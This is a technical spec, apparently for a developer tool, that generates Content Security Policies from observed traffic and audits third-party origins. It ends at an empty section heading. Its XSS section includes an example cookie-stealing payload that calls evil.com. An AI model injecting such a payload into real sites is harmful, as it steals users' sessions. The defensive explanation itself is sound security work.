---
status: proposed
scope: feature/security-hardening/implementation
ai-priority: high
tags: [implementation, architecture]
relates-to: [product-spec.md, qa-plan.md]
last-verified: 2026-03-05
doc_type: tech-spec
feature_id: feature-security-hardening
last_reviewed: 2026-07-05
last_verified_version: 0.7.12
last_verified_date: 2026-03-05
---

> **[MIGRATION NOTICE]**
> Canonical location for this tech spec. Migrated from `/docs/ai-first/tech-spec-security-hardening.md` on 2026-01-26.
> See also: [Product Spec](product-spec.md) and [Security Hardening Review](./index.md).

# Technical Spec: Security Hardening Tools

## Purpose

Developers often know they should add security headers, configure CSP, and audit third-party dependencies — but these tasks are tedious and error-prone when done manually. These four tools flip the model: instead of the developer researching what to configure, Kaboom observes what the app actually does and generates the correct security configuration automatically.

All four tools are opt-in. They analyze data Kaboom already captures (network requests, response headers, resource origins) and produce actionable output the developer can directly apply to their app.

---

## Tool 1: CSP Generator (`generate_csp`)

### Purpose

Content Security Policy is the single most effective defense against XSS, but writing one from scratch is painful. You need to enumerate every script origin, style source, font host, image CDN, API endpoint, and WebSocket connection your app uses. Miss one and the page breaks. Be too permissive and the CSP provides no protection.

Kaboom already sees every resource the page loads. The CSP Generator analyzes a session's worth of network traffic and produces a tight policy that allows exactly what was observed — nothing more.

### The Attack: Cross-Site Scripting (XSS)

XSS remains the #1 web vulnerability by volume (OWASP Top 10, CWE-79). The attack works like this:

1. **Attacker finds an injection point** — a form field, URL parameter, or stored content that's rendered without sanitization
2. **Attacker injects executable content** — `<script>alert(document.cookie)</script>`, an event handler like `onload=fetch('https://evil.com/?c='+document.cookie)`, or a crafted URL that triggers DOM manipulation
3. **Victim's browser executes the payload** — the browser can't distinguish attacker-injected scripts from legitimate application scripts
4. **Attacker achieves their goal** — session hijacking (steal cookies/tokens), credential harvesting (inject fake login form), keylogging, cryptocurrency mining, worm propagation (MySpace/Samy), or data exfiltration

**What CSP prevents:** A properly configured CSP tells the browser "only execute scripts from these specific origins." Even if an attacker injects a `<script>` tag, the browser blocks it because the script doesn't come from an allowed source. Inline event handlers are blocked. `eval()` is blocked. The injected code simply doesn't run.

**Why developers still don't have CSP:** Writing a correct CSP is tedious. You need to enumerate every script origin (`cdn.jsdelivr.net`, `www.google-analytics.com`, etc.), every style source, every font host, every image CDN. Miss one legitimate source and your app breaks silently. Add too many and the CSP provides no protection. Most developers give up and either ship `unsafe-inline` (useless) or no CSP at all.

**Real-world CSP adoption:** As of 2024, only ~14% of the top 1M websites deploy CSP at all. Of those, ~40% use `unsafe-inline` which defeats the purpose entirely. The problem isn't awareness — it's that writing a correct policy is genuinely hard.

**How Kaboom solves this:** Instead of the developer manually researching what origins to include, Kaboom observes what the app actually loads during normal development. The developer just browses their app. Kaboom produces the exact CSP needed — nothing more, nothing less. The barrier goes from "spend hours researching CDN origins" to "browse your app for 5 minutes, copy the header."

### How It Works

The developer uses their app normally — navigating pages, triggering features, loading different views. During this time, the server maintains an **origin accumulator** — a separate, append-only data structure that records every unique `origin + resource_type + page_url` combination observed. This accumulator is independent of the ring buffer used for network bodies, so it never loses data to eviction.

When the developer calls `generate_csp`, the server:

1. Reads the origin accumulator (not the network body buffer — which may have rolled over)
2. Filters out development pollution (extension origins, known dev servers)
3. Categorizes each origin by resource type (script, style, image, font, connect, frame, media, etc.)
4. Computes a confidence score per origin based on observation count and session coverage
5. For each CSP directive, builds the minimal set of source expressions needed
6. Identifies any inline scripts/styles (detected via CSP violation logs or DOM queries)
7. Flags low-confidence origins with warnings
8. Produces a complete CSP header value and an equivalent `<meta>` tag

### Origin Accumulator

The origin accumulator solves the ring buffer problem. Network bodies are stored in a fixed-size ring buffer (typically 1000 entries) — early resources get evicted during long sessions. But CSP generation needs to know about ALL origins ever observed, including page-load resources that happened at the start.

The accumulator is a separate map keyed by `origin + directive_type`. Each entry stores:

- Origin (e.g., `https://cdn.example.com`)
- Directive type (e.g., `script-src`)
- Observation count (how many requests to this origin of this type)
- First seen timestamp
- Last seen timestamp
- Page URLs where this origin was loaded (up to 10, for coverage reporting)

This structure is bounded by nature — apps rarely communicate with more than 50 unique origins. Even an app loading from 100 distinct origin+type pairs would use ~10KB. The accumulator is populated as network bodies arrive (same ingestion path, zero additional extension changes) and persists for the session lifetime.

The accumulator is cleared when the session resets (server restart or explicit clear). It is NOT cleared when the network body buffer wraps around.

### MCP Tool Definition

```json
{
  "name": "generate_csp",
  "description": "Generate a Content-Security-Policy header based on all resources observed during the current session. Browse your app normally first, then call this tool to get a CSP that allows exactly what was loaded.",
  "inputSchema": {
    "type": "object",
    "properties": {
      "mode": {
        "type": "string",
        "enum": ["strict", "moderate", "report_only"],
        "description": "strict: nonce-based, no unsafe-inline. moderate: hash-based for known inline scripts. report_only: same policy but as Content-Security-Policy-Report-Only (default: moderate)"
      },
      "include_report_uri": {
        "type": "boolean",
        "description": "Include a report-uri directive pointing to a Kaboom endpoint for violation logging (default: false)"
      },
      "exclude_origins": {
        "type": "array",
        "items": { "type": "string" },
        "description": "Origins to exclude from the generated policy (e.g., development-only tools)"
      }
    }
  }
}
```

### Response Format

```json
{
  "csp_header": "default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' https://images.example.com data:; connect-src 'self' https://api.example.com wss://realtime.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'",
  "meta_tag": "<meta http-equiv=\"Content-Security-Policy\" content=\"...\">",
  "directives": {
    "default-src": ["'self'"],
    "script-src": ["'self'", "https://cdn.example.com"],
    "style-src": ["'self'", "https://fonts.googleapis.com"],
    "font-src": ["https://fonts.gstatic.com"],
    "img-src": ["'self'", "https://images.example.com", "data:"],
    "connect-src": ["'self'", "https://api.example.com", "wss://realtime.example.com"],
    "frame-ancestors": ["'none'"],
    "base-uri": ["'self'"],
    "form-action": ["'self'"]
  },
  "origin_details": [
    {
      "origin": "https://cdn.example.com",
      "directive": "script-src",
      "confidence": "high",
      "observation_count": 47,
      "first_seen": "2026-01-24T10:00:12Z",
      "last_seen": "2026-01-24T10:45:00Z",
      "pages_seen_on": ["/", "/dashboard", "/settings", "/profile"],
      "included": true
    },
    {
      "origin": "https://unknown-tracker.xyz",
      "directive": "script-src",
      "confidence": "low",
      "observation_count": 1,
      "first_seen": "2026-01-24T10:32:00Z",
      "last_seen": "2026-01-24T10:32:00Z",
      "pages_seen_on": ["/dashboard"],
      "included": false,
      "exclusion_reason": "Low confidence: observed only once. May be injected by extension or ad network. Add to exclude_origins or manually include after verification."
    }
  ],
  "filtered_origins": [
    {
      "origin": "chrome-extension://abc123...",
      "reason": "Browser extension origin (auto-filtered)"
    },
    {
      "origin": "ws://localhost:3001",
      "reason": "Development server (auto-filtered, matches dev_patterns)"
    }
  ],
  "observations": {
    "total_resources": 47,
    "unique_origins": 7,
    "origins_included": 5,
    "origins_filtered": 2,
    "inline_scripts_detected": 2,
    "inline_styles_detected": 1,
    "data_uris_detected": 3,
    "pages_visited": 6,
    "session_duration_seconds": 2700
  },
  "warnings": [
    "2 inline scripts detected — consider externalizing or use nonce/hash (see inline_scripts field)",
    "data: URIs used for images — this allows any data URI image, consider specific sources",
    "1 origin excluded due to low confidence (seen once) — review origin_details for details",
    "Only 6 pages visited — ensure all app routes are exercised for complete coverage"
  ],
  "inline_scripts": [
    {
      "source_page": "/dashboard",
      "hash": "sha256-abc123...",
      "preview": "window.__CONFIG = {...}",
      "recommendation": "Move to external file or add hash to script-src"
    }
  ],
  "recommended_next_step": "Deploy as Content-Security-Policy-Report-Only first. Browse all pages again and check for violations via Kaboom's console error capture. Once no violations occur, switch to enforcing mode."
}
```

### Resource Classification

Kaboom maps network requests to CSP directives based on response content-type and request context:

| Content-Type / Context | CSP Directive |
|----------------------|---------------|
| `application/javascript`, `text/javascript` | `script-src` |
| `text/css` | `style-src` |
| `font/woff2`, `font/woff`, `font/ttf`, `application/font-*` | `font-src` |
| `image/*` | `img-src` |
| `audio/*`, `video/*` | `media-src` |
| XHR/fetch requests (`application/json`, etc.) | `connect-src` |
| WebSocket connections | `connect-src` (wss://) |
| iframe sources (detected from response headers/DOM) | `frame-src` |
| Web workers | `worker-src` |
| EventSource streams | `connect-src` |

### Origin Extraction

For each captured resource URL, the origin is extracted as `scheme://host[:port]`. Special cases:

- `data:` URIs → literal `data:` source
- `blob:` URIs → literal `blob:` source
- Same-origin resources → `'self'`
- Localhost with different ports → specific origin (not collapsed to `'self'`)

### Inline Detection

Kaboom detects inline scripts/styles through:
- CSP violation console errors mentioning `inline` (if a CSP is already partially configured)
- Same-origin script/style responses where the URL is the page URL itself (indicates inline)
- The DOM query tool can be used to enumerate `<script>` and `<style>` tags without `src`/`href`

For inline content, the tool computes SHA-256 hashes and includes them in the policy (moderate mode) or recommends nonces (strict mode).

### Strict Mode Differences

| Aspect | Moderate | Strict |
|--------|----------|--------|
| Inline scripts | Hash-based (`'sha256-...'`) | Requires nonces (app must generate) |
| Inline styles | `'unsafe-inline'` with hashes | Hash-based |
| `eval()` | Blocked | Blocked |
| Trusted Types | Not enforced | `require-trusted-types-for 'script'` |

### Confidence Scoring

Each origin gets a confidence level based on how reliably it was observed:

| Confidence | Criteria | Behavior |
|-----------|----------|----------|
| **high** | Observed 5+ times across 2+ pages | Included in CSP automatically |
| **medium** | Observed 2-4 times, or on 1 page only | Included with advisory note |
| **low** | Observed exactly once | **Excluded by default** — listed in `origin_details` for manual review |

The minimum observation threshold for automatic inclusion is configurable but defaults to 2. This prevents a single injected request from permanently polluting the policy.

For `connect-src` (API endpoints), the threshold is relaxed to 1 observation since API calls to specific endpoints may only happen once per session (e.g., a DELETE request). These are still flagged if the origin itself was only seen once.

### Development Pollution Filtering

The tool automatically excludes origins that are clearly development-only:

| Pattern | Reason |
|---------|--------|
| `chrome-extension://` | Browser extension injection |
| `moz-extension://` | Firefox extension injection |
| `ws://localhost:*` (any port) | Dev server hot reload |
| `http://localhost:*` (ports != page port) | Dev tools on different ports |
| `http://127.0.0.1:*` (ports != page port) | Same as above |
| `*.hot-update.json` | Webpack HMR |
| `/__vite_*`, `/@vite/*` | Vite dev server |
| `/__next/*` (non-production) | Next.js dev mode |
| `*.map` (source maps) | Not loaded in production |

Filtered origins are listed in the `filtered_origins` response field so the developer can see what was excluded and override if needed.

The developer can also pass `exclude_origins` to manually filter known development-only services (e.g., `["https://dev-analytics.internal.com"]`).

### Recommended Workflow (Two-Pass)

Generating and immediately enforcing a CSP is risky — missing origins break pages silently. The recommended workflow is:

#### Pass 1: Observe and Generate
1. Browse the app normally (hit all routes, trigger all features)
2. Call `generate_csp` with `mode: "report_only"`
3. Deploy the policy as `Content-Security-Policy-Report-Only` header
4. Browse the app again — violations appear in console (Kaboom captures these)

#### Pass 2: Refine and Enforce
5. Call `generate_csp` again — violations from pass 1 inform missing origins
6. Review `origin_details` — any low-confidence origins that caused violations are now promoted to high confidence
7. Deploy as enforcing `Content-Security-Policy`

This two-pass approach ensures no resources are missed, even lazy-loaded ones that weren't triggered in the initial observation window.

### Threat Model & Countermeasures

Since this tool generates a security policy, it is itself a security-sensitive component. An attacker who can influence the generated CSP can weaken it permanently.

#### Threat 1: Observation Poisoning

**Attack:** An attacker injects a request to `evil.com` during the observation window (via existing XSS, compromised ad network, MITM on HTTP resources, or malicious browser extension). The origin is included in the generated CSP, permanently allowlisting the attacker's domain.

**Countermeasure:** Low-confidence origins (observed once) are excluded by default. The response explicitly lists these for manual review. An attacker would need to inject the same origin multiple times across multiple pages to reach "high" confidence — which is significantly harder than a single injected request.

**Residual risk:** If an attacker controls a resource that loads on every page (e.g., a compromised CDN script that phones home), their origin would reach high confidence. This is mitigated by the developer reviewing `origin_details` — unexpected origins should be investigated regardless of confidence.

#### Threat 2: Development Environment Pollution

**Attack:** Developer generates CSP while running locally with dev tools, extensions, and HMR active. Deploys to production with dev-only origins in the policy.

**Countermeasure:** Automatic dev pollution filtering (see above). Known dev patterns are excluded by default. The tool also warns if the page origin is `localhost` — suggesting the developer re-run against a staging/preview deployment for production-accurate results.

#### Threat 3: Incomplete Observation (False Safety)

**Attack:** Not a malicious attack, but a footgun. Developer visits 3 of 20 pages, generates CSP, deploys. The other 17 pages break because their resources aren't in the policy.

**Countermeasure:** The response includes `pages_visited` count and the `recommended_next_step` always suggests report-only mode first. Additionally, context streaming (if enabled) will push notifications when CSP violations occur in the browser — alerting the AI immediately if the policy is too restrictive.

#### Threat 4: Extension Script Injection

**Attack:** Chrome extensions inject content scripts and sometimes inline `<script>` tags. These get observed and potentially included in the policy (especially inline script hashes).

**Countermeasure:** `chrome-extension://` origins are always filtered. For inline scripts, the tool cross-references with what's actually in the page source (via DOM query). Inline scripts that don't appear in the page's original HTML are flagged as "possibly injected by extension" and excluded from hash computation.

#### Threat 5: Subdomain Takeover

**Attack:** CSP includes `https://old-assets.example.com` because the app loaded a resource from there. Later the subdomain is abandoned. Attacker takes it over — CSP still allows scripts from it.

**Countermeasure:** The tool cannot detect future subdomain abandonment. However, it flags origins with low observation counts and origins that weren't seen in the most recent session (stale origins). The recommended approach is to re-run `generate_csp` periodically (e.g., as part of the release PR workflow) so the policy stays current with what the app actually loads.

#### Threat 6: Nonce/Hash Prediction (Strict Mode)

**Attack:** In moderate mode, inline script hashes are included in the CSP. If an attacker can predict or observe these hashes, they could craft a script with the same hash.

**Countermeasure:** SHA-256 is collision-resistant — crafting a meaningful malicious script with a target hash is computationally infeasible. In strict mode, nonces are used instead (must be generated server-side per request), which eliminates this class entirely. The tool recommends strict mode for production deployments.

### Limitations

- The generated CSP only covers resources observed during the session. The two-pass workflow mitigates but doesn't eliminate this.
- Dynamic imports (`import()`) or lazy-loaded resources only appear if the code path was triggered during observation.
- Source maps and dev-only resources are filtered, which means the CSP won't work in dev mode without adjustments. This is intentional — the CSP is for production.
- `frame-ancestors` cannot be set via `<meta>` tag — only via HTTP header. The tool notes this in the response.
- The tool cannot detect resources loaded by Service Workers that bypass the page's network stack (rare edge case).

---

## Tool 2: Third-Party Risk Audit (`audit_third_parties`)

### Purpose

Modern web apps pull in dozens of third-party resources — CDNs, analytics, fonts, ad networks, payment processors, chat widgets. Developers often don't know the full extent of what their app loads or what data it sends to external services.

Kaboom sees every network request, making it trivial to build a complete map of third-party communication. This tool categorizes each external domain by risk level based on what type of access it has (executable code vs. static assets) and what data flows to it.

### The Attacks

#### Attack 1: Supply Chain Compromise (CDN/Package Takeover)

1. **Attacker compromises a CDN or popular package** — this has happened repeatedly: event-stream (2018, 2M weekly downloads), ua-parser-js (2021, 8M weekly downloads), colors.js (2022, 25M weekly downloads), Polyfill.io (2024, 100K+ sites)
2. **Legitimate script is replaced with malicious version** — the CDN serves modified code that includes a cryptocurrency miner, credential stealer, or data exfiltrator
3. **All sites loading from that CDN are instantly compromised** — because the script runs with full page context (same origin as the CSP allows)
4. **Attack persists until someone notices** — could be hours to weeks; the Polyfill.io attack ran for months before detection

**What makes this devastating:** The developer explicitly added this script. It's in their HTML. Their tests pass. Their CSP allows it. The attack happens entirely within "legitimate" infrastructure.

**How Kaboom helps:** The audit tool shows exactly which third-party origins have script-level access to your page. Combined with SRI (Tool 4), you can detect when a CDN-served resource changes unexpectedly. The reputation system flags origins that become suspicious after initial inclusion. This doesn't prevent the attack, but it surfaces the attack surface explicitly — most developers can't name all third-party origins their app communicates with.

#### Attack 2: Transitive Dependency Exfiltration

1. **Developer adds a legitimate library** (e.g., a date picker component)
2. **The library loads its own dependencies** from additional CDNs or sends analytics/telemetry data to the library author's servers
3. **Fourth-party origins now have access** to the page context or receive data about user behavior
4. **Developer never consented to these additional origins** — they added ONE library, not six third-party connections

**How Kaboom helps:** The audit maps ALL third-party communication, not just what the developer explicitly added. A developer who adds `date-picker.js` might not know it loads scripts from `analytics.datepicker-company.com` and sends usage data to `telemetry.lib-metrics.io`. The audit makes this visible.

#### Attack 3: Privacy Violation (PII Leakage to Third Parties)

1. **Developer integrates analytics or A/B testing SDK**
2. **SDK automatically captures form data, including PII fields** (email, name, phone number)
3. **PII is transmitted to third-party servers** without user consent
4. **Data protection violation occurs** — regulatory fines can reach 4% of annual revenue or $7,500 per violation depending on jurisdiction

**Real-world example:** In 2022, Meta Pixel was found to be collecting health data from hospital websites, tax information from tax prep sites, and financial data from banking apps — all via automatic form capture that developers didn't realize was active.

**How Kaboom helps:** The tool inspects outbound POST/PUT request bodies to third-party origins and flags field names matching PII patterns. If your analytics SDK is sending `email`, `phone`, or `ssn` to a third-party server, the audit surfaces this explicitly with field names and destination.

### How It Works

The tool analyzes all captured network requests and separates first-party (same origin as the page) from third-party. For each third-party origin, it determines:

1. What type of resources it provides (scripts, styles, images, API calls)
2. Whether data flows TO it (outbound POST/PUT requests)
3. Whether it sets cookies
4. Whether it loads sub-resources from yet more origins (fourth-party risk)
5. Whether its resources have Subresource Integrity (SRI) attributes

### MCP Tool Definition

```json
{
  "name": "audit_third_parties",
  "description": "Analyze all third-party domains your application communicates with. Shows what each external service has access to, what data flows to it, and its risk level. Browse your app first to capture traffic.",
  "inputSchema": {
    "type": "object",
    "properties": {
      "first_party_origins": {
        "type": "array",
        "items": { "type": "string" },
        "description": "Origins to consider 'first-party' (auto-detected from page URLs if not specified)"
      },
      "include_static": {
        "type": "boolean",
        "description": "Include static asset CDNs in the report (default: true)"
      },
      "custom_lists": {
        "type": "object",
        "description": "Enterprise custom lists for domain classification (overrides bundled reputation)",
        "properties": {
          "allowed": {
            "type": "array",
            "items": { "type": "string" },
            "description": "Origins your organization has approved (e.g., internal CDNs, approved vendors)"
          },
          "blocked": {
            "type": "array",
            "items": { "type": "string" },
            "description": "Origins your organization prohibits (e.g., banned trackers, competitors)"
          },
          "internal": {
            "type": "array",
            "items": { "type": "string" },
            "description": "First-party origins across the organization (treated same as first_party_origins)"
          }
        }
      },
      "custom_lists_file": {
        "type": "string",
        "description": "Path to a JSON file containing custom lists (same schema as custom_lists parameter). File-based lists persist across sessions."
      },
      "enable_external_enrichment": {
        "type": "boolean",
        "description": "Opt-in: query external reputation services (RDAP, Certificate Transparency). Requires network access. Default: false"
      }
    }
  }
}
```

### Response Format

```json
{
  "first_party_origin": "https://myapp.example.com",
  "third_parties": [
    {
      "origin": "https://cdn.jsdelivr.net",
      "risk_level": "high",
      "risk_reason": "Loads executable code (scripts)",
      "resources": {
        "scripts": 3,
        "styles": 1,
        "fonts": 0,
        "images": 0,
        "other": 0
      },
      "data_outbound": false,
      "sets_cookies": false,
      "has_sri": false,
      "first_seen": "2026-01-24T10:00:00Z",
      "request_count": 4,
      "total_transfer_bytes": 245000,
      "urls": [
        "https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js",
        "https://cdn.jsdelivr.net/npm/react@18/umd/react.production.min.js"
      ],
      "reputation": {
        "classification": "known_cdn",
        "source": "bundled:curated_cdns",
        "tranco_rank": 45,
        "notes": "Well-known open-source CDN, widely used"
      }
    },
    {
      "origin": "https://api.analytics.example.com",
      "risk_level": "medium",
      "risk_reason": "Receives user data (outbound POST requests)",
      "resources": {
        "scripts": 0,
        "styles": 0,
        "fonts": 0,
        "images": 0,
        "other": 2
      },
      "data_outbound": true,
      "outbound_details": {
        "methods": ["POST"],
        "content_types": ["application/json"],
        "contains_pii_fields": ["email", "user_id"]
      },
      "sets_cookies": true,
      "has_sri": null,
      "request_count": 12,
      "total_transfer_bytes": 8400,
      "reputation": {
        "classification": "unknown",
        "source": null,
        "tranco_rank": null,
        "domain_age_days": null,
        "suspicion_flags": []
      }
    },
    {
      "origin": "https://sketchy-tracker.xyz",
      "risk_level": "critical",
      "risk_reason": "Loads executable code AND receives outbound data; domain flagged as suspicious",
      "resources": {
        "scripts": 1,
        "styles": 0,
        "fonts": 0,
        "images": 0,
        "other": 1
      },
      "data_outbound": true,
      "sets_cookies": true,
      "has_sri": false,
      "request_count": 3,
      "total_transfer_bytes": 12000,
      "reputation": {
        "classification": "suspicious",
        "source": "bundled:heuristics",
        "tranco_rank": null,
        "suspicion_flags": ["abuse_tld", "recently_registered_pattern", "not_in_tranco_top_100k"],
        "notes": ".xyz TLD commonly associated with abuse; domain not in Tranco top 100K"
      },
      "enterprise_status": null
    }
  ],
  "reputation_summary": {
    "known_good": 3,
    "known_tracker": 1,
    "suspicious": 1,
    "unknown": 3,
    "enterprise_allowed": 0,
    "enterprise_blocked": 0,
    "lists_loaded": ["bundled:disconnect", "bundled:tranco_10k", "bundled:curated_cdns"]
  },
  "summary": {
    "total_third_parties": 9,
    "critical_risk": 1,
    "high_risk": 2,
    "medium_risk": 3,
    "low_risk": 3,
    "total_scripts_from_third_parties": 6,
    "scripts_without_sri": 6,
    "origins_receiving_data": 3,
    "origins_setting_cookies": 4,
    "suspicious_origins": 1,
    "unknown_origins": 3
  },
  "recommendations": [
    "CRITICAL: sketchy-tracker.xyz loads scripts AND receives data — domain flagged as suspicious (.xyz TLD, not in Tranco). Investigate immediately.",
    "6 third-party scripts loaded without Subresource Integrity — use `generate_sri` to fix",
    "3 origins receive user data via POST — verify these are intentional and necessary",
    "analytics.example.com receives PII fields (email, user_id) — ensure privacy policy covers this",
    "1 origin has suspicious reputation flags — review reputation details and consider blocking"
  ]
}
```

### Risk Classification

| Risk Level | Criteria |
|-----------|----------|
| **critical** | Loads scripts AND receives outbound data (full control + data exfil) |
| **high** | Loads executable code (scripts, workers) — can run arbitrary code in page context |
| **medium** | Receives outbound data (POST/PUT requests with bodies) OR sets cookies |
| **low** | Provides static assets only (images, fonts, styles) with no data flow back |
| **info** | Prefetch/DNS-prefetch hints with no actual requests observed |

### First-Party Detection

The tool auto-detects first-party origins from the page URLs observed in the session. All unique page origins are considered first-party. The developer can override this with `first_party_origins` for apps that span multiple domains (e.g., `app.example.com` and `api.example.com`).

### PII Field Detection in Outbound Data

For POST/PUT requests to third-party origins, the tool checks request bodies for field names matching PII patterns (reuses the same patterns from `security_audit` check 3): email, phone, name, address, user_id, etc. This helps developers identify when they're sharing user data with third parties.

### Domain Reputation

Every third-party origin is classified using a layered reputation system. The base layer uses bundled lists that ship with the Kaboom binary — no network calls required. An optional external enrichment layer provides deeper intelligence for organizations that opt in.

#### Bundled Lists (~380KB total, compiled into binary)

| List | Source | Purpose | Update Cadence |
|------|--------|---------|---------------|
| **Disconnect.me Tracker List** | disconnect.me/trackerprotection | Classify known trackers, ad networks, social widgets | Each Kaboom release |
| **Tranco Top 10K** | tranco-list.eu | Identify well-established domains (high Tranco rank = low suspicion) | Each Kaboom release |
| **Curated CDN List** | Maintained by Kaboom | Recognize known-good CDNs (jsdelivr, cdnjs, unpkg, googleapis, cloudflare, etc.) | Each Kaboom release |
| **Mozilla Public Suffix List** | publicsuffix.org | Proper domain extraction (distinguishes `github.io` from `user.github.io`) | Each Kaboom release |

Lists are compiled into the binary as Go maps at build time. No filesystem access or runtime downloads needed. The lists ship at the version available when the Kaboom binary was built. Users update reputation data by updating Kaboom itself.

#### Classification Logic

For each third-party origin, the reputation engine evaluates in order:

1. **Enterprise custom lists** (highest priority) — if the origin matches an `allowed`, `blocked`, or `internal` entry, that classification wins immediately
2. **Disconnect.me** — if the origin appears in the tracker list, classify as `known_tracker` with the Disconnect category (advertising, analytics, social, content, fingerprinting)
3. **Curated CDN list** — if the origin matches a known CDN pattern, classify as `known_cdn`
4. **Tranco rank** — if the domain appears in Tranco top 10K, classify as `known_popular` (low risk indicator, not definitive)
5. **Domain heuristics** — check for suspicious patterns (see below)
6. **Default** — if none of the above match, classify as `unknown`

#### Domain Suspicion Heuristics

When a domain doesn't appear in any bundled list, heuristic checks flag potential concerns:

| Heuristic | What It Detects | Implementation |
|-----------|----------------|----------------|
| **Abuse TLDs** | `.xyz`, `.top`, `.click`, `.loan`, `.work`, `.tk`, `.ml`, `.ga`, `.cf` | List of TLDs with disproportionate abuse rates |
| **DGA Patterns** | `x7k2m9p.example.com` — random-looking subdomains | Entropy calculation on subdomain labels (> 3.5 bits/char = suspicious) |
| **Excessive Subdomain Depth** | `a.b.c.d.e.example.com` — 4+ subdomain levels | Depth count after public suffix extraction |
| **Shared Hosting Indicators** | `user123.netlify.app`, `abc.vercel.app`, `def.pages.dev` | Known shared hosting suffixes (from PSL) |
| **Not in Tranco** | Domain absent from top 100K | Absence alone is informational, combined with other flags becomes suspicious |

A domain is classified as `suspicious` when two or more heuristic flags are triggered simultaneously. A single flag results in a note but not a classification change.

#### Reputation Classifications

| Classification | Meaning | CSP Impact |
|---------------|---------|------------|
| `known_cdn` | Well-known content delivery network | High confidence in CSP generator |
| `known_popular` | High Tranco rank, widely used | High confidence |
| `known_tracker` | Matches Disconnect.me tracker list | Flagged, not auto-included in CSP |
| `enterprise_allowed` | Organization has approved this origin | High confidence |
| `enterprise_blocked` | Organization prohibits this origin | Excluded from CSP, flagged critical |
| `suspicious` | Multiple heuristic flags triggered | Low confidence in CSP, warning generated |
| `unknown` | No data available | Medium confidence (neutral) |

### Enterprise Custom Lists

Organizations often have approved vendor lists, internal domain registries, and prohibited origin policies. Custom lists let enterprises codify these policies so `audit_third_parties` and `generate_csp` enforce them automatically.

#### Providing Custom Lists

Custom lists can be provided in two ways:

**1. Inline (per-call):** Pass `custom_lists` in the tool parameters. Useful for quick one-off audits or when lists are generated dynamically.

**2. File-based (persistent):** Point `custom_lists_file` to a JSON file. The file is read each time the tool runs, so updates take effect immediately. This is the recommended approach for teams — commit the file to the repo and all developers share the same policy.

#### File Format

```json
{
  "version": 1,
  "organization": "Acme Corp",
  "updated": "2026-01-24T10:00:00Z",
  "allowed": [
    {
      "origin": "https://cdn.acme-internal.com",
      "reason": "Internal CDN for static assets",
      "approved_by": "security-team",
      "expires": "2027-01-01T00:00:00Z"
    },
    {
      "origin": "https://analytics.approved-vendor.com",
      "reason": "Approved analytics provider (contract #12345)",
      "approved_by": "legal",
      "expires": null
    }
  ],
  "blocked": [
    {
      "origin": "https://competitor-analytics.com",
      "reason": "Corporate policy: no competitor analytics",
      "blocked_by": "security-team"
    },
    {
      "origin": "*.doubleclick.net",
      "reason": "Ad network prohibited by privacy policy",
      "blocked_by": "privacy-team"
    }
  ],
  "internal": [
    "https://api.acme.com",
    "https://cdn.acme.com",
    "https://auth.acme.com",
    "https://*.acme-internal.com"
  ]
}
```

#### Origin Matching

Custom list entries support two matching modes:

- **Exact origin**: `https://cdn.example.com` — matches only that exact origin
- **Wildcard subdomain**: `*.example.com` — matches any subdomain of example.com (but NOT example.com itself)

Port matching: if no port is specified in the entry, any port on that host matches. If a port is specified, only that port matches.

#### Precedence Rules

When multiple sources classify the same origin:

1. **`blocked` always wins** — if an origin is in both `allowed` and `blocked`, it's blocked (fail-safe)
2. **`internal` treated as first-party** — origins in the `internal` list are excluded from third-party analysis entirely
3. **`allowed` overrides bundled** — an enterprise-allowed origin ignores Disconnect.me tracker classification (the org has explicitly approved it)
4. **Expiry enforced** — expired `allowed` entries are treated as if they don't exist (origin falls back to bundled classification)

#### CI/CD Integration

The custom lists file can be validated in CI:

```bash
# Validate JSON schema
kaboom validate-lists .kaboom/custom-lists.json

# Audit against a live session (headless browser)
kaboom audit --custom-lists .kaboom/custom-lists.json --url https://staging.example.com
```

These CLI commands are future work — initially, custom lists are consumed only via the MCP tool interface.

### Optional External Enrichment

When `enable_external_enrichment: true` is passed, the tool makes network requests to external services for deeper intelligence. This is opt-in because it breaks Kaboom's zero-network-calls principle — organizations that enable it accept the privacy trade-off (domain names are sent to external services).

#### Available Enrichment Sources

| Source | What It Provides | Privacy Impact |
|--------|-----------------|---------------|
| **RDAP (Registration Data)** | Domain age, registrar, registration date | Domain names sent to RDAP servers |
| **Certificate Transparency (crt.sh)** | Certificate history, issuance patterns | Domain names sent to crt.sh |
| **Google Safe Browsing** | Known malware/phishing domains | Domain hashes sent to Google (prefix-based, partial privacy) |

#### RDAP Integration

RDAP (Registration Data Access Protocol) replaces WHOIS with a structured JSON API. For each unknown or suspicious origin, the tool queries the appropriate RDAP server to determine:

- **Domain age** — recently registered domains (< 30 days) are higher risk
- **Registrar** — certain registrars are associated with higher abuse rates
- **Registration pattern** — bulk-registered domains at the same time suggest disposable infrastructure

RDAP queries are rate-limited to 1 request per second. Results are cached for the session lifetime (no persistent storage). Only the registrable domain is queried (not full subdomains).

#### Certificate Transparency Integration

Certificate Transparency logs record every TLS certificate issued. By querying crt.sh, the tool can determine:

- **Certificate count** — how many certs have been issued for this domain (low count + recent registration = suspicious)
- **Wildcard usage** — excessive wildcard certs suggest shared infrastructure
- **Issuer diversity** — legitimate domains typically use 1-2 CAs consistently

This is informational — no domain is automatically blocked based on CT data alone.

#### Safe Browsing Integration

Google Safe Browsing uses a prefix-based lookup (hash prefixes are sent, not full URLs) that provides partial privacy. If a domain appears on Safe Browsing's malware or phishing lists, it is immediately flagged as `malicious` — the highest severity.

Safe Browsing results override all other classifications. A domain flagged by Safe Browsing will never appear in a generated CSP, regardless of enterprise `allowed` lists (with a warning that the allowed entry conflicts with Safe Browsing data).

#### Enrichment Response Fields

When external enrichment is enabled, each origin in the response includes additional fields:

```json
{
  "reputation": {
    "classification": "suspicious",
    "source": "external:rdap+heuristics",
    "tranco_rank": null,
    "domain_age_days": 12,
    "registrar": "NameCheap, Inc.",
    "certificates_issued": 1,
    "safe_browsing_status": "clean",
    "suspicion_flags": ["recently_registered", "abuse_tld", "low_certificate_count"],
    "notes": "Domain registered 12 days ago on .xyz TLD with only 1 certificate issued"
  }
}
```

#### Performance and Caching

External enrichment adds latency. To minimize impact:

- Results are cached per-session (same domain isn't queried twice)
- Only unknown/suspicious origins are enriched (known CDNs and Tranco top 10K domains skip external lookups)
- Queries run concurrently with a max of 5 in-flight requests
- Total enrichment phase is bounded to 10 seconds — remaining domains are reported as "enrichment timed out"

### CSP Generator Integration

